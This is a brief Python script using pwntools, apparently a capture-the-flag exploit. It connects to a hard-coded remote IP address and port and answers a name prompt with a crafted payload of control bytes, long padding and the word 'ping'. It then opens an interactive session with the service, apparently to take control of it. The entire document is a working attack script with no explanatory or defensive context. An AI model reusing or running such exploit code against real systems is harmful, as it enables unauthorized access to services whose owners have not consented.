from pwn import *

io = remote('188.245.212.74', 32100)
io.recvuntil(b'Enter your name: \n')
io.sendline(b'\x01\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaping\n')
print(io.recvall())
io.interactive()
